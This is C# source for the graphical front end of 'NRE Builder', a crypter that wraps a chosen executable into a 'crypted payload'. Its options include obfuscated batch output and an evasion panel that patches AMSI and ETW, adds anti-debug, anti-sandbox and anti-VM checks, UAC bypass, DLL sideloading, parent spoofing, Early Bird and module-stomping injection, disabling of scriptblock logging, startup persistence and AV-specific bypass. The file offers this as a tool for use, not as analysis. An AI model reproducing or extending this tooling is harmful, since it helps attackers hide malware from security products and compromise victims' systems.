using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ImGuiNET;
using NRE.Builder.Commands;
using NRE.Builder.Configuration;
using NRE.Core.Common;
using NRE.Core.Evasion;
using Veldrid;
using Veldrid.Sdl2;
using Veldrid.StartupUtilities;

namespace NRE.BuilderGui
{
    static class Program
    {
        static Sdl2Window _window;
        static GraphicsDevice _gd;
        static CommandList _cl;
        static ImGuiRenderer _controller;

        static string _inputPath = "";
        static string _outputPath = "crypted.exe";
        static bool _compress = true;
        static int _compressFormatIndex = 0; // 0=lznt1, 1=xpress, 2=aplib
        static int _delaySeconds = 0;
        static string _mutexName = "";
        static bool _outputBat = false;

        static bool _patchAmsi = true, _patchEtw = true, _wldp, _amsiHbp;
        static bool _antidebug, _antisandbox, _antivm, _uacBypass, _dllSideload, _parentSpoof;
        static bool _threadpool, _earlybird, _moduleStomping;
        static bool _scriptblockLog, _startup, _specific;

        static readonly string[] CompressFormats = { "LZNT1", "Xpress", "Aplib" };
        static readonly object _logLock = new object();
        static readonly List<string> _logLines = new List<string>();
        static bool _building;
        static bool _buildSuccess;
        static string _buildStatus = "";

        [STAThread]
        static void Main(string[] args)
        {
            if (IntPtr.Size != 8)
            {
                MessageBox.Show("NRE Builder GUI must run as 64-bit.\nRebuild the NRE.BuilderGui project with PlatformTarget=x64.", "NRE Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                Run();
            }
            catch (Exception ex)
            {
                var msg = (ex.InnerException ?? ex).Message + "\n\n" + ex.StackTrace;
                try { MessageBox.Show(msg, "NRE Builder – startup error", MessageBoxButtons.OK, MessageBoxIcon.Error); } catch { }
            }
        }

        static void Run()
        {
            var wci = new WindowCreateInfo(80, 80, 720, 620, WindowState.Normal, "NRE Builder");
            var gdo = new GraphicsDeviceOptions(false, null, true, ResourceBindingModel.Improved, true, true);
            VeldridStartup.CreateWindowAndGraphicsDevice(wci, gdo, out _window, out _gd);
            _window.Resized += () =>
            {
                _gd.MainSwapchain.Resize((uint)_window.Width, (uint)_window.Height);
                _controller?.WindowResized(_window.Width, _window.Height);
            };
            _cl = _gd.ResourceFactory.CreateCommandList();
            _controller = new ImGuiRenderer(_gd, _gd.MainSwapchain.Framebuffer.OutputDescription, _window.Width, _window.Height);

            ApplyDarkTheme();

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            while (_window.Exists)
            {
                float dt = stopwatch.ElapsedTicks / (float)System.Diagnostics.Stopwatch.Frequency;
                stopwatch.Restart();
                var snapshot = _window.PumpEvents();
                if (!_window.Exists) break;
                _controller.Update(dt, snapshot);

                SubmitUI();

                _cl.Begin();
                _cl.SetFramebuffer(_gd.MainSwapchain.Framebuffer);
                _cl.ClearColorTarget(0, new RgbaFloat(0.09f, 0.09f, 0.10f, 1f));
                _controller.Render(_gd, _cl);
                _cl.End();
                _gd.SubmitCommands(_cl);
                _gd.SwapBuffers(_gd.MainSwapchain);
            }

            _gd.WaitForIdle();
            _controller.Dispose();
            _cl.Dispose();
            _gd.Dispose();
        }

        static void ApplyDarkTheme()
        {
            var style = ImGui.GetStyle();
            style.WindowRounding = 6f;
            style.ChildRounding = 4f;
            style.FrameRounding = 3f;
            style.GrabRounding = 2f;
            style.ScrollbarRounding = 4f;
            style.WindowPadding = new System.Numerics.Vector2(12, 12);
            style.FramePadding = new System.Numerics.Vector2(6, 4);
            style.ItemSpacing = new System.Numerics.Vector2(6, 4);
            style.ItemInnerSpacing = new System.Numerics.Vector2(4, 2);
            style.IndentSpacing = 16f;
            style.ScrollbarSize = 8f;

            // Charcoal base like the reference
            var bg = new System.Numerics.Vector4(0.11f, 0.11f, 0.13f, 0.98f);
            var panel = new System.Numerics.Vector4(0.14f, 0.14f, 0.16f, 1f);
            var panelHover = new System.Numerics.Vector4(0.16f, 0.16f, 0.18f, 1f);
            var frame = new System.Numerics.Vector4(0.16f, 0.16f, 0.18f, 1f);
            var frameHover = new System.Numerics.Vector4(0.18f, 0.18f, 0.20f, 1f);
            var frameActive = new System.Numerics.Vector4(0.20f, 0.24f, 0.26f, 1f); // subtle teal tint when focused
            var accent = new System.Numerics.Vector4(0.38f, 0.72f, 0.82f, 1f);
            var accentHov = new System.Numerics.Vector4(0.45f, 0.78f, 0.88f, 1f);
            var accentAct = new System.Numerics.Vector4(0.30f, 0.65f, 0.75f, 1f);
            var text = new System.Numerics.Vector4(0.96f, 0.96f, 0.98f, 1f);
            var textMuted = new System.Numerics.Vector4(0.55f, 0.55f, 0.60f, 1f);
            var separator = new System.Numerics.Vector4(0.22f, 0.22f, 0.25f, 1f);

            var colors = style.Colors;
            colors[(int)ImGuiCol.WindowBg] = bg;
            colors[(int)ImGuiCol.ChildBg] = panel;
            colors[(int)ImGuiCol.Header] = new System.Numerics.Vector4(accent.X, accent.Y, accent.Z, 0.4f);
            colors[(int)ImGuiCol.HeaderHovered] = new System.Numerics.Vector4(accentHov.X, accentHov.Y, accentHov.Z, 0.5f);
            colors[(int)ImGuiCol.HeaderActive] = new System.Numerics.Vector4(accentAct.X, accentAct.Y, accentAct.Z, 0.6f);
            colors[(int)ImGuiCol.Button] = new System.Numerics.Vector4(accent.X, accent.Y, accent.Z, 0.85f);
            colors[(int)ImGuiCol.ButtonHovered] = accentHov;
            colors[(int)ImGuiCol.ButtonActive] = accentAct;
            colors[(int)ImGuiCol.FrameBg] = frame;
            colors[(int)ImGuiCol.FrameBgHovered] = frameHover;
            colors[(int)ImGuiCol.FrameBgActive] = frameActive;
            colors[(int)ImGuiCol.CheckMark] = accent;
            colors[(int)ImGuiCol.SliderGrab] = accent;
            colors[(int)ImGuiCol.SliderGrabActive] = accentAct;
            colors[(int)ImGuiCol.Separator] = separator;
            colors[(int)ImGuiCol.Text] = text;
            colors[(int)ImGuiCol.TextDisabled] = textMuted;
        }

        static void SubmitUI()
        {
            ImGui.SetNextWindowPos(System.Numerics.Vector2.Zero, ImGuiCond.Always);
            ImGui.SetNextWindowSize(new System.Numerics.Vector2(_window.Width, _window.Height), ImGuiCond.Always);
            ImGui.Begin("NRE Builder", ImGuiWindowFlags.NoTitleBar | ImGuiWindowFlags.NoResize | ImGuiWindowFlags.NoMove | ImGuiWindowFlags.NoCollapse);

            // Header bar
            ImGui.PushStyleColor(ImGuiCol.ChildBg, new System.Numerics.Vector4(0.10f, 0.10f, 0.12f, 1f));
            ImGui.BeginChild("header", new System.Numerics.Vector2(-1, 28), true);
            ImGui.PopStyleColor();
            ImGui.PushStyleColor(ImGuiCol.Text, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 1f));
            ImGui.SetCursorPosY(ImGui.GetCursorPosY() + 2);
            ImGui.Text("NRE Builder");
            ImGui.PopStyleColor();
            ImGui.SameLine();
            ImGui.SetCursorPosY(ImGui.GetCursorPosY() + 2);
            ImGui.TextDisabled("  \u2022  Crypted payload builder");
            ImGui.EndChild();

            ImGui.Spacing();

            ImGui.Columns(2, "main", false);
            ImGui.SetColumnOffset(1, _window.Width * 0.46f);
            ImGui.BeginChild("left", new System.Numerics.Vector2(-1, -28), true);

            ImGui.PushStyleColor(ImGuiCol.Text, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 1f));
            ImGui.Text("Paths");
            ImGui.PopStyleColor();
            ImGui.TextDisabled("Input payload");
            ImGui.PushItemWidth(-64);
            ImGui.InputText("##input", ref _inputPath, 512);
            ImGui.PopItemWidth();
            ImGui.SameLine();
            if (ImGui.Button("Browse", new System.Numerics.Vector2(52, 0)))
            {
                using (var d = new OpenFileDialog { Filter = "Executables|*.exe;*.dll|All|*.*", Title = "Select payload" })
                    if (d.ShowDialog() == DialogResult.OK) _inputPath = d.FileName;
            }

            ImGui.TextDisabled("Output path");
            ImGui.PushItemWidth(-64);
            ImGui.InputText("##output", ref _outputPath, 512);
            ImGui.PopItemWidth();
            ImGui.SameLine();
            if (ImGui.Button("Save", new System.Numerics.Vector2(52, 0)))
            {
                using (var d = new SaveFileDialog { Filter = "Executable|*.exe|Batch|*.bat|All|*.*", FileName = _outputPath, Title = "Save output" })
                    if (d.ShowDialog() == DialogResult.OK) _outputPath = d.FileName;
            }

            ImGui.Spacing();
            ImGui.Separator();
            ImGui.PushStyleColor(ImGuiCol.Text, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 1f));
            ImGui.Text("Options");
            ImGui.PopStyleColor();
            ImGui.Checkbox("Compress payload", ref _compress);
            if (_compress)
            {
                ImGui.SameLine(160);
                ImGui.PushItemWidth(90);
                ImGui.Combo("Format", ref _compressFormatIndex, CompressFormats, CompressFormats.Length);
                ImGui.PopItemWidth();
            }
            ImGui.Checkbox("Output as .bat (obfuscated)", ref _outputBat);
            ImGui.PushItemWidth(56);
            ImGui.InputInt("Delay (sec)", ref _delaySeconds, 1, 5);
            ImGui.PopItemWidth();
            if (_delaySeconds < 0) _delaySeconds = 0;
            if (_delaySeconds > 3600) _delaySeconds = 3600;
            ImGui.TextDisabled("Mutex name (optional)");
            ImGui.InputText("##mutex", ref _mutexName, 128);

            ImGui.Spacing();
            ImGui.Separator();
            ImGui.PushStyleColor(ImGuiCol.Text, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 1f));
            ImGui.Text("Evasion");
            ImGui.PopStyleColor();
            ImGui.BeginChild("evasion", new System.Numerics.Vector2(-1, 160), true);
            ImGui.Columns(2, null, false);
            ImGui.Checkbox("Patch AMSI", ref _patchAmsi);
            ImGui.Checkbox("Patch ETW", ref _patchEtw);
            ImGui.Checkbox("WLDP", ref _wldp);
            ImGui.Checkbox("AMSI HBP", ref _amsiHbp);
            ImGui.Checkbox("Anti-debug", ref _antidebug);
            ImGui.Checkbox("Anti-sandbox", ref _antisandbox);
            ImGui.Checkbox("Anti-VM", ref _antivm);
            ImGui.NextColumn();
            ImGui.Checkbox("UAC bypass", ref _uacBypass);
            ImGui.Checkbox("DLL sideload", ref _dllSideload);
            ImGui.Checkbox("Parent spoof", ref _parentSpoof);
            ImGui.Checkbox("Thread pool", ref _threadpool);
            ImGui.Checkbox("Early Bird", ref _earlybird);
            ImGui.Checkbox("Module stomping", ref _moduleStomping);
            ImGui.Checkbox("Scriptblock log", ref _scriptblockLog);
            ImGui.Checkbox("Startup persist", ref _startup);
            ImGui.Checkbox("AV-specific", ref _specific);
            ImGui.Columns(1);
            ImGui.EndChild();

            ImGui.EndChild();
            ImGui.NextColumn();
            ImGui.BeginChild("log", new System.Numerics.Vector2(-1, -28), true);
            ImGui.PushStyleColor(ImGuiCol.Text, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 1f));
            ImGui.Text("Log");
            ImGui.PopStyleColor();
            ImGui.Separator();
            lock (_logLock)
            {
                if (_logLines.Count == 0)
                    ImGui.TextDisabled(" Ready. Set input/output and click Build.");
                else
                {
                    for (int i = 0; i < _logLines.Count; i++)
                        ImGui.TextUnformatted(_logLines[i]);
                    if (_logLines.Count > 0)
                        ImGui.SetScrollY(ImGui.GetScrollMaxY());
                }
            }
            ImGui.EndChild();
            ImGui.Columns(1);

            // Footer with Build button
            ImGui.Spacing();
            ImGui.Separator();
            ImGui.Spacing();
            if (_building)
            {
                ImGui.PushStyleVar(ImGuiStyleVar.Alpha, 0.6f);
                ImGui.PushStyleColor(ImGuiCol.Button, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 0.5f));
                ImGui.Button("Building...", new System.Numerics.Vector2(88, 22));
                ImGui.PopStyleColor();
                ImGui.PopStyleVar();
            }
            else
            {
                ImGui.PushStyleColor(ImGuiCol.Button, new System.Numerics.Vector4(0.25f, 0.72f, 0.68f, 0.9f));
                ImGui.PushStyleColor(ImGuiCol.ButtonHovered, new System.Numerics.Vector4(0.32f, 0.82f, 0.78f, 1f));
                ImGui.PushStyleColor(ImGuiCol.ButtonActive, new System.Numerics.Vector4(0.18f, 0.62f, 0.58f, 1f));
                if (ImGui.Button("Build", new System.Numerics.Vector2(88, 22)))
                    StartBuild();
                ImGui.PopStyleColor(3);
            }
            ImGui.SameLine();
            ImGui.SetCursorPosY(ImGui.GetCursorPosY() + 4);
            ImGui.TextColored(_buildSuccess ? new System.Numerics.Vector4(0.35f, 0.88f, 0.45f, 1f) : new System.Numerics.Vector4(0.95f, 0.45f, 0.4f, 1f), _buildStatus);

            ImGui.End();
        }

        static void StartBuild()
        {
            if (_building) return;
            _building = true;
            _buildStatus = "";
            _buildSuccess = false;
            lock (_logLock) _logLines.Clear();

            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var outPath = _outputPath;
                    if (_outputBat && !outPath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase))
                        outPath = Path.ChangeExtension(outPath, ".bat");

                    var cfg = CompressionFormat.LZNT1;
                    if (_compress)
                    {
                        if (_compressFormatIndex == 1) cfg = CompressionFormat.Xpress;
                        else if (_compressFormatIndex == 2) cfg = CompressionFormat.Aplib;
                    }
                    else
                        cfg = CompressionFormat.None;

                    RefEvasionFromCheckboxes();
                    var config = new BuildConfig
                    {
                        InputPath = _inputPath,
                        OutputPath = outPath,
                        Compress = _compress,
                        CompressionFormat = cfg,
                        Evasion = (EvasionOptions)_evasion,
                        OutputBat = _outputBat,
                        DelaySeconds = _delaySeconds,
                        MutexName = _mutexName ?? ""
                    };

                    var logOut = new StringWriter();
                    var logErr = new StringWriter();
                    var oldOut = Console.Out;
                    var oldErr = Console.Error;
                    Console.SetOut(logOut);
                    Console.SetError(logErr);
                    try
                    {
                        _buildSuccess = BuildCommands.RunBuild(config);
                    }
                    finally
                    {
                        Console.SetOut(oldOut);
                        Console.SetError(oldErr);
                    }
                    var combined = (logOut.ToString() + logErr.ToString()).Trim();
                    lock (_logLock)
                    {
                        foreach (var line in combined.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                        {
                            _logLines.Add(line);
                            if (_logLines.Count > 500) _logLines.RemoveAt(0);
                        }
                    }
                    _buildStatus = _buildSuccess ? "Done." : "Failed.";
                }
                catch (Exception ex)
                {
                    lock (_logLock) _logLines.Add("Error: " + ex.Message);
                    _buildStatus = "Error.";
                }
                finally
                {
                    _building = false;
                }
            });
        }

        static uint _evasion;

        static void RefEvasionFromCheckboxes()
        {
            _evasion = 0;
            if (_patchAmsi) _evasion |= (uint)EvasionOptions.PatchAMSI;
            if (_patchEtw) _evasion |= (uint)EvasionOptions.PatchETW;
            if (_wldp) _evasion |= (uint)EvasionOptions.PatchWLDP;
            if (_amsiHbp) _evasion |= (uint)EvasionOptions.AmsiHBP;
            if (_antidebug) _evasion |= (uint)EvasionOptions.AntiDebug;
            if (_antisandbox) _evasion |= (uint)EvasionOptions.AntiSandbox;
            if (_antivm) _evasion |= (uint)EvasionOptions.AntiVM;
            if (_uacBypass) _evasion |= (uint)EvasionOptions.UacBypass;
            if (_dllSideload) _evasion |= (uint)EvasionOptions.DllSideload;
            if (_parentSpoof) _evasion |= (uint)EvasionOptions.ParentSpoof;
            if (_threadpool) _evasion |= (uint)EvasionOptions.ExecuteThreadPool;
            if (_earlybird) _evasion |= (uint)EvasionOptions.ExecuteEarlyBird;
            if (_moduleStomping) _evasion |= (uint)EvasionOptions.ExecuteModuleStomping;
            if (_scriptblockLog) _evasion |= (uint)EvasionOptions.DisableScriptBlockLog;
            if (_startup) _evasion |= (uint)EvasionOptions.PersistStartup;
            if (_specific) _evasion |= (uint)EvasionOptions.AvSpecificBypass;
        }
    }
}
